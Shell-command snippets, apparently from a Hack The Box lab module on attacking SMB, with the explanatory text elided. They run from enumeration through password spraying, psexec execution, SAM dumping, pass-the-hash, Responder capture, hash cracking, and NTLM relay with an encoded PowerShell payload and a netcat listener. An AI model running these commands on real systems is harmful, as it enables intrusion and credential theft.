...
```shell-session
frank-106@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
...
```shell-session
frank-106@htb[/htb]$ smbclient -N -L //10.129.14.128
...
```shell-session
frank-106@htb[/htb]$ smbmap -H 10.129.14.128
...
```shell-session
frank-106@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
...
```shell-session
frank-106@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
...
```shell-session
frank-106@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
...
```shell-session
frank-106@htb[/htb]$ rpcclient -U'%' 10.10.110.17
...
```shell-session
frank-106@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
...
```shell-session
frank-106@htb[/htb]$ cat /tmp/userlist.txt
...
```shell-session
frank-106@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
...
```shell-session
frank-106@htb[/htb]$ impacket-psexec -h
...
```shell-session
frank-106@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
...
```shell-session
frank-106@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
...
```shell-session
frank-106@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
...
```shell-session
frank-106@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
...
```shell-session
frank-106@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
...
```shell-session
frank-106@htb[/htb]$ responder -I <interface name>
```
...
```shell-session
frank-106@htb[/htb]$ sudo responder -I ens33
...
```shell-session
frank-106@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
...
```shell-session
frank-106@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
...
```shell-session
frank-106@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
...
```shell-session
frank-106@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e '
```
...
```shell-session
frank-106@htb[/htb]$ nc -lvnp 9001
